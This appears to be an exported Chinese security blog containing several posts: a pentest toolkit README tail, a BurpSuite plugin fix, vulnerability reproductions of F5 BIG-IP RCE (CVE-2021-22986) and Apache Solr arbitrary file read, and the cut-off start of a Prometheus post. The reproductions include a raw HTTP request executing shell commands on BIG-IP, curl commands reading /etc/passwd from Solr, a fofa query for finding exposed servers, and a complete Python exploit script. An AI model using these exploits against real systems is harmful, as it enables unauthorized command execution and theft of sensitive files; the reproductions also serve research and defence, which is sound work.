<h3 id="403-bypass"><a href="#403-bypass" class="headerlink" title="403 bypass"></a>403 bypass</h3><p>Swagger 会自动进行 403 bypass</p>
<p><a href="https://github.com/devploit/dontgo403">https://github.com/devploit/dontgo403</a></p>
<p>未实现<a href="https://infosecwriteups.com/403-bypass-lyncdiscover-microsoft-com-db2778458c33">https://infosecwriteups.com/403-bypass-lyncdiscover-microsoft-com-db2778458c33</a></p>
<h3 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h3><ul>
<li>JWT token 解析，<a href="https://jwt.io/">jwt.io</a> 样式显示</li>
<li>JWT 秘钥爆破</li>
</ul>
<h3 id="BurpSuite"><a href="#BurpSuite" class="headerlink" title="BurpSuite"></a>BurpSuite</h3><p>使用 <a href="https://github.com/lqqyt2423/go-mitmproxy">go-mitmproxy</a> 项目实现 BurpSuite 的 功能</p>
<p><a href="https://github.com/lqqyt2423/go-mitmproxy#usage">证书安装</a>:</p>
<p>启动后HTTP代理地址默认设置为9080端口</p>
<p>第一次启动后需要安装证书来解析HTTPS流量。 证书会在第一次启动命令后自动生成，保存在~&#x2F;.mitmproxy&#x2F;mitmproxy-ca-cert.pem. 安装步骤可以在 Python mitmproxy 文档中找到：<a href="https://docs.mitmproxy.org/stable/concepts-certificates/">关于证书</a>。</p>
<ul>
<li><input checked="" disabled="" type="checkbox"> Proxy 模块</li>
<li><input checked="" disabled="" type="checkbox"> Repeater 模块</li>
<li><input checked="" disabled="" type="checkbox"> Intruder 模块</li>
</ul>
<h3 id="字典可配置"><a href="#字典可配置" class="headerlink" title="字典可配置"></a>字典可配置</h3><p>用到的各种字典文件, 第一次运行会将内置字典释放到用户目录的<code>.config/ChYing</code>目录下，后续每次运行都会先读取一遍</p>
<h3 id="编码、解码"><a href="#编码、解码" class="headerlink" title="编码、解码"></a>编码、解码</h3><p>Unicode 、URL、Hex、Base64 编&#x2F;解码</p>
<p>MD5 加密</p>
<h3 id="杀软识别"><a href="#杀软识别" class="headerlink" title="杀软识别"></a>杀软识别</h3><p><a href="https://github.com/gh0stkey/avList/blob/master/avlist.js">https://github.com/gh0stkey/avList/blob/master/avlist.js</a></p>
<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>前端不会，全靠 ChatGPT </p>
<ul>
<li>现在各个 tabs 页面，不点进去不会激活，导致 BurpSuite 用之前必须点击一遍每个页面</li>
<li>Intruder 模块<ul>
<li>Attack 显示不能切换别的 Intruder tab页，不然结果就不显示了，前端数据绑定问题，太菜了，还没想好怎么写</li>
</ul>
</li>
</ul>
<h2 id="License"><a href="#License" class="headerlink" title="License"></a>License</h2><p>This code is distributed under the <a href="https://github.com/yhy0/ChYing/blob/main/LICENSE">AGPL-3.0 license</a>. See <a href="https://github.com/yhy0/ChYing/blob/main/LICENSE">LICENSE</a> in this directory.</p>
<h2 id="鸣谢"><a href="#鸣谢" class="headerlink" title="鸣谢"></a>鸣谢</h2><p>感谢 <a href="https://www.jetbrains.com/">JetBrains</a> 提供的一系列好用的 IDE 和对本项目的支持。</p>
<p><img src="https://resources.jetbrains.com/storage/products/company/brand/logos/jb_beam.svg" alt="JetBrains Logo (Main) logo"></p>
<p><a href="https://github.com/lijiejie/bbscan">https://github.com/lijiejie/bbscan</a></p>
<p><a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a></p>
<p><a href="https://github.com/devploit/dontgo403">https://github.com/devploit/dontgo403</a></p>
<p><a href="https://github.com/lqqyt2423/go-mitmproxy">https://github.com/lqqyt2423/go-mitmproxy</a></p>
<p><a href="https://github.com/gh0stkey/avList/">https://github.com/gh0stkey/avList/</a></p>
<p><a href="https://wails.io/">https://wails.io/</a></p>
<p><a href="https://www.naiveui.com/">https://www.naiveui.com/</a></p>
<h2 id="Star-History"><a href="#Star-History" class="headerlink" title="Star History"></a>Star History</h2><p><a href="https://star-history.com/#yhy0/ChYing&Date"><img src="https://api.star-history.com/svg?repos=yhy0/ChYing&type=Date" alt="Star History Chart"></a></p>
]]></content>
      <categories>
        <category>GitHub工具</category>
        <category>开源</category>
        <category>安全工具</category>
      </categories>
      <tags>
        <tag>GitHub工具</tag>
        <tag>开源</tag>
        <tag>安全工具</tag>
      </tags>
  </entry>
  <entry>
    <title>更优雅的BurpSuite被动扫描流量转发插件实现</title>
    <url>/2023/11/09/%E6%9B%B4%E4%BC%98%E9%9B%85%E7%9A%84BurpSuite%E8%A2%AB%E5%8A%A8%E6%89%AB%E6%8F%8F%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91%E6%8F%92%E4%BB%B6%E5%AE%9E%E7%8E%B0/</url>
    <content><![CDATA[<blockquote>
<p>  小朋友真是活跃，走个不停，要时刻盯着</p>
</blockquote>
<p>本文首发于先知社区:<a href="https://xz.aliyun.com/t/13005">https://xz.aliyun.com/t/13005</a></p>
<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>最近在为扫描器添加被动扫描模式，发现在 BurpSuite 中设置上游代理，<code>Intruder</code>、<code>Repeater</code> 模块也会走上游代理，这对于设置上游搞内网很合适，但对于被动扫描器来说有点不适合了，一般这两个模块都是手动测试时才会用到，这时流量都被转发到被动扫描器就不是很好了，会增加很多无用扫描（即使被动扫描器存在流量去重功能）。</p>
<p>找了一圈没发现 Burp 中可以设置这一块，想到<a href="https://github.com/c0ny1">@c0ny1</a>师傅写过一个插件 <a href="https://github.com/c0ny1/passive-scan-client">passive-scan-client</a> ，测试时发现，插件根本没有工作，<a href="https://github.com/c0ny1/passive-scan-client/issues">issues</a>中也有这种情况反馈，修复之后测试发现和<code>Burp</code>中设置上游没什么两样，(⊙o⊙)…</p>
<h2 id="排错"><a href="#排错" class="headerlink" title="排错"></a>排错</h2><h3 id="IDEA-调试"><a href="#IDEA-调试" class="headerlink" title="IDEA 调试"></a>IDEA 调试</h3><p>在IDEA 配置远程调试</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202311092210755.png" alt="image-20231106225618020"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202311092210573.png" alt="image-20231106225632918"></p>
<p>简单起见，这里直接使用社区版作为调试, 命令行启动 Burp 社区版</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -agentlib:jdwp=transport=dt_socket,server=y,<span class="built_in">suspend</span>=n,address=5005 -jar burpsuite_community_v2023.10.2.4.jar</span><br></pre></td></tr></table></figure>

<p>生成 jar 文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mvn package</span><br></pre></td></tr></table></figure>

<p>Burp 中加载该插件，启动</p>
<p>然后IDEA 点击 Debug 启动刚才的配置 ，找个代码位置下个断点</p>
<p>访问测试网站，比如 <a href="http://testphp.vulnweb.com/">http://testphp.vulnweb.com/</a> ，ok，IDEA 中已经可以看到拦截了</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202311092210126.png" alt="image-20231106231111350"></p>
<p>debug 时发现程序在 </p>
<p><code>String headerValue = &quot;Basic &quot; + Base64.encode(user_pass.getBytes());</code> 这一行就直接结束了。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202311092211094.png" alt="image-20231106233217811"></p>
<p>嗯？什么鬼？明明是空，怎么就进来的？</p>
<p>老方法输出一下看看</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202311092211059.png" alt="image-20231106233321850"></p>
<p>所以不设置用户名、密码时这里会出错，这类应该使用<code>isEmpty()</code>函数进行判断。但是为什么debug 看到的也明明是空，<code>username</code>又不是 <code>null</code>，为什么会发生这种情况？</p>
<p>所有的这个判断都修改一下，先结束排错。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202311092211468.png" alt="image-20231106234626399"></p>
<p>接下来改造该插件，让它像我预想的那样工作</p>
<h2 id="改造"><a href="#改造" class="headerlink" title="改造"></a>改造</h2><p>该插件通过继承实现了<code>IProxyListener</code>中的<code>processProxyMessage</code>方法来实现获取请求信息，这个方法翻了一下官方 api，没有找到可以控制相关模块的地方。</p>
<p>官方 API 太难看了，不太友好，找了一会，各种搜索还是没发现，想到<a href="https://github.com/smxiazi">@算命縖子</a>师傅有个<a href="https://github.com/smxiazi/xia_sql">插件</a>，我用过类似功能</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202311092211226.png" alt="image-20231108214115297"></p>
<p>通过继承<code>IHttpListener</code>实现<code>processHttpMessage</code> 方法，该方法有个<code>int</code>参数,就是用来判断各种模块的，接下来就很简单了，通过 <code>toolFlag</code> 的值来进行判断是<code>Proxy</code>、<code>Intruder</code> 还是<code>Repeater</code> 模块。逻辑改好了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processHttpMessage</span><span class="params">(<span class="type">int</span> toolFlag, <span class="type">boolean</span> messageIsRequest, IHttpRequestResponse messageInfo)</span> &#123;</span><br><span class="line">        <span class="comment">// 插件开启</span></span><br><span class="line">        <span class="keyword">if</span> (Config.IS_RUNNING &amp;&amp; !messageIsRequest) &#123;</span><br><span class="line">            <span class="comment">// 开启监控 Proxy，并且该消息是 Proxy 模块的</span></span><br><span class="line">            <span class="keyword">if</span>(Config.PROXY &amp;&amp; toolFlag == IBurpExtenderCallbacks.TOOL_PROXY) &#123;</span><br><span class="line">            ......</span><br></pre></td></tr></table></figure>

<p><code> BurpExtender.this.callbacks.registerProxyListener(BurpExtender.this);</code> </p>
<p>修改为</p>
<p><code>BurpExtender.this.callbacks.registerHttpListener(BurpExtender.this);</code></p>
<p>剩下就是依葫芦画瓢增加 GUI 控制。具体的看代码这里就不贴了,地址: <a href="https://github.com/yhy0/passive-scan-client">https://github.com/yhy0/passive-scan-client</a></p>
<p>效果图：</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202311092211895.png" alt="image-20231108221005846"></p>
<p>默认只会监控 <code>Proxy</code>模块，另外两个看情况开启，比如前端收集到一堆 api，这时通过<code>Intruder</code>模块进行 Fuzz，配合被动扫描器的比如 403 绕过，进行一起测试，非常巴适。</p>
<p>这里还将被动扫描器的Basic认证请求头单独拎出来了，可以自主设置，不然不看代码都不清楚这一块内容，还有就是<a href="https://github.com/c0ny1">@c0ny1</a>师傅不知道基于怎样的考虑，将转发流量这一操作，每个流量间隔 5 秒钟，时间太长了，之前我都不知道这个时间是用来干嘛的，这里修改了一下默认 100 毫秒 (注：经大佬提醒可能是<code>是为了留出容错空间，假设不小心点错了一个添加的功能，还可以有5 秒时间反悔 kill 被动扫描的进程，免得插一堆脏数据</code>)</p>
<p>整体下来没什么难度，修改后的插件也算是解决一个小痛点了，师傅们使用被动扫描器时可以使用该工具选择需要转发的数据。</p>
<p>相关代码已提交 pr，项目原地址：<a href="https://github.com/c0ny1/passive-scan-client">https://github.com/c0ny1/passive-scan-client</a></p>
<p>等不及的可以去这里拿：<a href="https://github.com/yhy0/passive-scan-client">https://github.com/yhy0/passive-scan-client</a></p>
<p>本人才疏学浅，如有疏漏之处，不吝赐教。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/c0ny1/passive-scan-client">https://github.com/c0ny1/passive-scan-client</a></p>
<p><a href="https://github.com/smxiazi/xia_sql">https://github.com/smxiazi/xia_sql</a></p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>Github</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>漏洞复现-F5 BIG-IP远程代码执行漏洞(CVE-2021-22986)</title>
    <url>/2021/04/04/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-F5%20BIG-IP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2021-22986)/</url>
    <content><![CDATA[<blockquote>
<p>  燕子来时新社，梨花落后清明。</p>
</blockquote>
<h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>F5 BIG-IP 是美国 F5 公司的一款集成了网络流量管理、应用程序安全管理、负载均衡等功能的应用交付平台。</p>
<p>CVE-2021-22986 该漏洞允许未经身份验证的攻击者通过BIG-IP管理界面和自身IP地址对iControl REST接口进行网络访问，以执行任意系统命令，创建或删除文件以及禁用服务。</p>
<h2 id="0x02-漏洞影响"><a href="#0x02-漏洞影响" class="headerlink" title="0x02 漏洞影响"></a>0x02 漏洞影响</h2><table>
<thead>
<tr>
<th align="center">F5 BIG-IP 16.0.0-16.0.1</th>
<th>F5 BIG-IP 12.1.0-12.1.5.2</th>
</tr>
</thead>
<tbody><tr>
<td align="center">F5 BIG-IP 15.1.0-15.1.2</td>
<td>F5 BIG-IQ 7.1.0-7.1.0.2</td>
</tr>
<tr>
<td align="center">F5 BIG-IP 14.1.0-14.1.3.1</td>
<td>F5 BIG-IQ 7.0.0-7.0.0.1</td>
</tr>
<tr>
<td align="center">F5 BIG-IP 13.1.0-13.1.3.5</td>
<td>F5 BIG-IQ 6.0.0-6.1.0</td>
</tr>
</tbody></table>
<h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><p><a href="https://login.f5.com/resource/registerEmail.do">https://login.f5.com/resource/registerEmail.do</a> 注册好后，下载</p>
<p><a href="https://downloads.f5.com/esd/eula.sv?sw=BIG-IP&pro=big-ip_v16.x&ver=16.0.1&container=16.0.1_Virtual-Edition&path=&file=&B1=I+Accept">https://downloads.f5.com/esd/eula.sv?sw=BIG-IP&amp;pro=big-ip_v16.x&amp;ver=16.0.1&amp;container=16.0.1_Virtual-Edition&amp;path=&amp;file=&amp;B1=I+Accept</a>  选择ova格式的，可以快速使用vm虚拟机打开，安装完后，用户名：root，密码：default，成功登陆后，输入config输入config ，几次回车即可看到当前ip，访问</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404144019.png" alt="image-20210404113304697"></p>
<h4 id="3-1-使用POC攻击"><a href="#3-1-使用POC攻击" class="headerlink" title="3.1 使用POC攻击"></a>3.1 使用POC攻击</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /mgmt/tm/util/bash HTTP/1.1</span><br><span class="line">Content-Type: application/json</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Authorization: Basic YWRtaW46QVNhc1M=</span><br><span class="line">X-F5-Auth-Token: </span><br><span class="line">Host: 192.168.1.191</span><br><span class="line">Content-Length: 39</span><br><span class="line"></span><br><span class="line">&#123;&quot;command&quot;:&quot;run&quot;,&quot;utilCmdArgs&quot;:&quot;-c id&quot;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404144015.png" alt="image-20210404111524871"></p>
<h2 id="0x04-利用工具编写"><a href="#0x04-利用工具编写" class="headerlink" title="0x04 利用工具编写"></a>0x04 利用工具编写</h2><p>直接使用上次的<a href="http://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247483987&idx=1&sn=2ee31ccbf8588c23e4184fcd3ab251f8&chksm=c2829b4af5f5125c563e437263eec4ebac08f32f2ace3e4bed9f5c8e562bac5299260b847c27#rd">图形化漏洞利用工具</a>编写</p>
<blockquote>
<p>图形化漏洞利用工具已更新</p>
<p>项目地址：<a href="https://github.com/yhy0/ExpDemo-JavaFX">https://github.com/yhy0/ExpDemo-JavaFX</a></p>
<p>V1.1 </p>
<p>​	参考冰蝎的代理，添加代理设置，方便走burp调试</p>
<p>​	优化批量检查逻辑，使用接口，这样每次添加新的漏洞利用时，就不需要修改批量检查的逻辑。</p>
</blockquote>
<p>在<code>src/main/java/com/yhy/core</code>下新建<code>CVE_2021_22986</code>类，实现<code>ExploitInterface</code>接口，并实现里面的函数，具体填充，直接将项目中的示例<code>CVE_2020_14882</code> 的内容复制过去，修改一下内容，填充payload即可</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404144011.png" alt="image-20210404113814410"></p>
<p>写完后，进入<code>src/main/java/com/yhy/core/Constants.java</code> 和 <code>src/main/java/com/yhy/tools/Tools.java</code>修改</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404144002.png" alt="image-20210404132413838"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404144006.png" alt="image-20210404132702066"></p>
<p>运行即可。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404143957.gif" alt="CVE-2021-22986"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>漏洞复现-Apache Solr 任意文件读取漏洞</title>
    <url>/2021/03/18/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Apache%20Solr%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<blockquote>
<p>  这周在hw，水一篇文章，记录一下漏洞利用，当一个合格的脚本小子</p>
</blockquote>
<h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>由于Apache Solr默认安装时未开启身份验证，导致未经身份验证的攻击者可利用Config API打开requestDispatcher.requestParsers.enableRemoteStreaming开关，从而使攻击者可以在未授权的情况下获取目标服务器敏感文件。</p>
<blockquote>
<p>  听说报给官方后，官方拒绝修复，认为这不是一个漏洞，比一些src还离谱，人家起码会给个内部已知:eyes:</p>
</blockquote>
<h2 id="0x02-漏洞影响"><a href="#0x02-漏洞影响" class="headerlink" title="0x02 漏洞影响"></a>0x02 漏洞影响</h2><center>Apache Solr <= 8.8.1（全版本）</center> 

<h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><p>fofa 语法：<code>app=&quot;Solr&quot;</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210318204223.png" alt="image-20210318195353083"></p>
<h4 id="3-1-获取-core-name，拼接url"><a href="#3-1-获取-core-name，拼接url" class="headerlink" title="3.1 获取 core name，拼接url"></a>3.1 获取 core name，拼接url</h4><p><code>http://xxx.xxx.xxx.xxx/solr/admin/cores?indexInfo=false&amp;wt=json</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210318204233.png" alt="image-20210318195317802"></p>
<p>Core name为：<code>arabnews</code>，那么使用的url 为 <code>http://xxx.xxx.xxx.xxx/solr/arabnews/config</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -d <span class="string">&#x27;&#123;  &quot;set-property&quot; : &#123;&quot;requestDispatcher.requestParsers.enableRemoteStreaming&quot;:true&#125;&#125;&#x27;</span> http://xxx.xxx.xxx.xxx/solr/arabnews/config -H <span class="string">&#x27;Content-type:application/json&#x27;</span></span><br></pre></td></tr></table></figure>

<p>继续使用 core name 拼接 <code>http://xxx.xxx.xxx.xxx/solr/arabnews/debug/dump?param=ContentStreams</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl <span class="string">&quot;http://xxx.xxx.xxx.xxx/solr/arabnews/debug/dump?param=ContentStreams&quot;</span> -F <span class="string">&quot;stream.url=file:///etc/passwd&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="3-2-攻击"><a href="#3-2-攻击" class="headerlink" title="3.2 攻击"></a>3.2 攻击</h4><p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210318204248.png" alt="image-20210318200603145"></p>
<h2 id="0x04-漏洞POC"><a href="#0x04-漏洞POC" class="headerlink" title="0x04  漏洞POC"></a>0x04  漏洞POC</h2><p>PeiQi文库的大佬已经写好了，我改了一点小毛病，读取完返回的值不一定是json，我复现的时候就遇到了这个问题，将json处理删掉了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author : PeiQi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">title</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+------------------------------------------&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[34mPOC_Des: http://wiki.peiqi.tech           \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[34mGithub : https://github.com/PeiQi0        \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[34m公众号  : PeiQi文库                        \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[34mVersion: Apache Solr &lt; 8.2.0            \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[36m使用格式: python3 CVE-2019-0193.py       \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[36mUrl    &gt;&gt;&gt; http://xxx.xxx.xxx.xxx:8983  \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[36mFile   &gt;&gt;&gt; 文件名称或目录                  \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+------------------------------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POC_1</span>(<span class="params">target_url</span>):</span><br><span class="line">    core_url = target_url + <span class="string">&quot;/solr/admin/cores?indexInfo=false&amp;wt=json&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.request(<span class="string">&quot;GET&quot;</span>, url=core_url, timeout=<span class="number">10</span>)</span><br><span class="line">        core_name = <span class="built_in">list</span>(json.loads(response.text)[<span class="string">&quot;status&quot;</span>])[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\033[32m[o] 成功获得core_name,Url为：&quot;</span> + target_url + <span class="string">&quot;/solr/&quot;</span> + core_name + <span class="string">&quot;/config\033[0m&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> core_name</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\033[31m[x] 目标Url漏洞利用失败\033[0m&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POC_2</span>(<span class="params">target_url, core_name</span>):</span><br><span class="line">    vuln_url = target_url + <span class="string">&quot;/solr/&quot;</span> + core_name + <span class="string">&quot;/config&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Content-type&quot;</span>:<span class="string">&quot;application/json&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    data = <span class="string">&#x27;&#123;&quot;set-property&quot; : &#123;&quot;requestDispatcher.requestParsers.enableRemoteStreaming&quot;:true&#125;&#125;&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">        response = requests.post(url=vuln_url, data=data, headers=headers, verify=<span class="literal">False</span>, timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\033[36m[o] 正在准备文件读取...... \033[0m&quot;</span>.<span class="built_in">format</span>(target_url))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;responseHeader&quot;</span> <span class="keyword">in</span> response.text <span class="keyword">and</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\033[32m[o] 目标 &#123;&#125; 可能存在漏洞 \033[0m&quot;</span>.<span class="built_in">format</span>(target_url))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\033[31m[x] 目标 &#123;&#125; 不存在漏洞\033[0m&quot;</span>.<span class="built_in">format</span>(target_url))</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\033[31m[x] 请求失败 \033[0m&quot;</span>, e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POC_3</span>(<span class="params">target_url, core_name, File_name</span>):</span><br><span class="line">    vuln_url = target_url + <span class="string">&quot;/solr/&#123;&#125;/debug/dump?param=ContentStreams&quot;</span>.<span class="built_in">format</span>(core_name)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    data = <span class="string">&#x27;stream.url=file://&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(File_name)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">        response = requests.post(url=vuln_url, data=data, headers=headers, verify=<span class="literal">False</span>, timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;No such file or directory&quot;</span> <span class="keyword">in</span> response.text:    </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\033[31m[x] 读取&#123;&#125;失败 \033[0m&quot;</span>.<span class="built_in">format</span>(File_name))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\033[36m[o] 响应为:\n&#123;&#125; \033[0m&quot;</span>.<span class="built_in">format</span>(response.text))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\033[31m[x] 请求失败 \033[0m&quot;</span>, e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    title()</span><br><span class="line">    target_url = <span class="built_in">str</span>(<span class="built_in">input</span>(<span class="string">&quot;\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m&quot;</span>))</span><br><span class="line">    core_name = POC_1(target_url)</span><br><span class="line">    POC_2(target_url, core_name)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        File_name = <span class="built_in">str</span>(<span class="built_in">input</span>(<span class="string">&quot;\033[35mFile &gt;&gt;&gt; \033[0m&quot;</span>))</span><br><span class="line">        POC_3(target_url, core_name, File_name)</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210318204258.png" alt="image-20210318204216768"></p>
<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg3NDU2MTg0Ng==&mid=2247484117&idx=1&sn=2fdab8cbe4b873f8dd8abb35d935d186&chksm=cecfaa8cf9b8239acbc83c363af62c41602cb167c485acc23a9850980044487585e6c408f632&scene=132#wechat_redirect">Apache Solr 任意文件读取漏洞 1Day</a></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>盗火者Prometheus</title>
    <url>/2023/02/18/%E7%9B%97%E7%81%AB%E8%80%85Prometheus/</url>
    <content><![CDATA[<blockquote>
<p>  今年多写文章，先把去年的清理一下</p>
</blockquote>
<h2 id="1-Prometheus"><a href="#1-Prometheus" class="headerlink" title="1.Prometheus"></a>1.Prometheus</h2><p>云原生的开源监控告警解决方案的一款产品</p>
<p>架构图</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302201057474.png" alt="image-20220926171326026"></p>
<table>
<thead>
<tr>
<th align="center"><a href="https://github.com/prometheus/prometheus">Prometheus server</a></th>
<th align="center">服务端，用于抓取和存储时间序列数据</th>
</tr>
</thead>
<tbody><tr>
